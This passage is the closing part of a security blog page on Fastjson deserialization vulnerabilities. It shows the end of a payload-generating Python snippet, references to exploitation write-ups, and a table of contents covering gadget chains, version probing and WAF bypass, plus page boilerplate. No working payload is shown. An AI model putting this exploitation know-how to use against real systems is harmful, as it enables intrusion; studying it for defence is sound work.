fjp.gen():</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://su18.org/post/fastjson/">Fastjson：我一路向北，离开有你的季节</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf">KCon2022 Hacking JSON</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">Fastjson Blacklist</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/fastjson-1.2.68/">Fastjson 68 commons-io AutoCloseable</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/">Fastjson 反序列化漏洞史</a></p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%86%B5"><span class="toc-number">2.</span> <span class="toc-text">基本概况</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Object2JSON"><span class="toc-number">2.1.</span> <span class="toc-text">Object2JSON</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSON2Object"><span class="toc-number">2.2.</span> <span class="toc-text">JSON2Object</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-parseObject"><span class="toc-number">2.3.</span> <span class="toc-text">parse&amp;parseObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getter-setter"><span class="toc-number">2.4.</span> <span class="toc-text">getter&amp;setter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parse%E7%AA%81%E7%A0%B4%E7%89%B9%E6%AE%8Agetter%E8%B0%83%E7%94%A8%E9%99%90%E5%88%B6"><span class="toc-number">2.5.</span> <span class="toc-text">parse突破特殊getter调用限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ref"><span class="toc-number">2.5.1.</span> <span class="toc-text">$ref</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSONObject"><span class="toc-number">2.5.2.</span> <span class="toc-text">JSONObject</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-24"><span class="toc-number">3.1.</span> <span class="toc-text">fastjson-1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">3.1.1.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">3.1.2.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-25"><span class="toc-number">3.2.</span> <span class="toc-text">fastjson-1.2.25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-42"><span class="toc-number">3.3.</span> <span class="toc-text">fastjson-1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-43"><span class="toc-number">3.4.</span> <span class="toc-text">fastjson-1.2.43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-44"><span class="toc-number">3.5.</span> <span class="toc-text">fastjson-1.2.44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-45"><span class="toc-number">3.6.</span> <span class="toc-text">fastjson-1.2.45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-47"><span class="toc-number">3.7.</span> <span class="toc-text">fastjson-1.2.47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-68"><span class="toc-number">3.8.</span> <span class="toc-text">fastjson-1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#commons-io"><span class="toc-number">3.8.1.</span> <span class="toc-text">commons-io</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CharSequenceInputStream"><span class="toc-number">3.8.1.1.</span> <span class="toc-text">CharSequenceInputStream</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FileWriterWithEncoding"><span class="toc-number">3.8.1.2.</span> <span class="toc-text">FileWriterWithEncoding</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WriterOutputStream"><span class="toc-number">3.8.1.3.</span> <span class="toc-text">WriterOutputStream</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#TeeInputStream"><span class="toc-number">3.8.1.4.</span> <span class="toc-text">TeeInputStream</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BOMInputStream"><span class="toc-number">3.8.1.5.</span> <span class="toc-text">BOMInputStream</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-80"><span class="toc-number">3.9.</span> <span class="toc-text">fastjson 1.2.80</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Groovy"><span class="toc-number">3.9.1.</span> <span class="toc-text">Groovy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JDBC"><span class="toc-number">3.9.2.</span> <span class="toc-text">JDBC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Aspectj"><span class="toc-number">3.9.3.</span> <span class="toc-text">Aspectj</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trick"><span class="toc-number">4.</span> <span class="toc-text">Trick</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.1.</span> <span class="toc-text">信息探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E6%9D%A5%E8%8E%B7%E5%8F%96%E7%89%88%E6%9C%AC%E5%8F%B7"><span class="toc-number">4.1.1.</span> <span class="toc-text">利用报错信息来获取版本号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E6%8A%A5%E9%94%99%E8%BF%9B%E8%A1%8Cfastjson%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.1.2.</span> <span class="toc-text">无报错进行fastjson版本探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8DNS%E8%AF%B7%E6%B1%82%E6%9D%A5%E6%8E%A2%E6%B5%8Bfastjson%E7%89%88%E6%9C%AC"><span class="toc-number">4.1.3.</span> <span class="toc-text">利用DNS请求来探测fastjson版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8FastJson%E7%9A%84%E5%9B%9E%E6%98%BE%E6%8A%A5%E9%94%99%E6%8E%A2%E6%B5%8B%E4%BE%9D%E8%B5%96"><span class="toc-number">4.1.4.</span> <span class="toc-text">利用FastJson的回显报错探测依赖</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#C3P0%E9%93%BEHEX%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">4.2.2.</span> <span class="toc-text">C3P0链HEX序列化字节加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%86%99%E5%85%A5"><span class="toc-number">4.2.3.</span> <span class="toc-text">文件读取写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL"><span class="toc-number">4.2.4.</span> <span class="toc-text">BCEL</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-WAF"><span class="toc-number">4.3.</span> <span class="toc-text">Bypass WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6"><span class="toc-number">4.3.1.</span> <span class="toc-text">空白字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E5%AD%97%E7%AC%A6"><span class="toc-number">4.3.2.</span> <span class="toc-text">注释字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%E7%9A%84Feature"><span class="toc-number">4.3.3.</span> <span class="toc-text">默认开启的Feature</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81"><span class="toc-number">4.3.4.</span> <span class="toc-text">编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%BA%E8%83%BD%E5%8C%B9%E9%85%8D"><span class="toc-number">4.3.5.</span> <span class="toc-text">智能匹配</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&text=Cursory Analysis Of Fastjson"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&title=Cursory Analysis Of Fastjson"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&is_video=false&description=Cursory Analysis Of Fastjson"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cursory Analysis Of Fastjson&body=Check out this article: https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&title=Cursory Analysis Of Fastjson"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&title=Cursory Analysis Of Fastjson"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&title=Cursory Analysis Of Fastjson"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&title=Cursory Analysis Of Fastjson"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&name=Cursory Analysis Of Fastjson&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&t=Cursory Analysis Of Fastjson"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    H3rmesk1t
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'H3rmesk1t/h3rmesk1t.github.io';
      var utterances_issue_term = 'pathname';
      var utterances_label = '💬';
      var utterances_theme = 'github-light';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
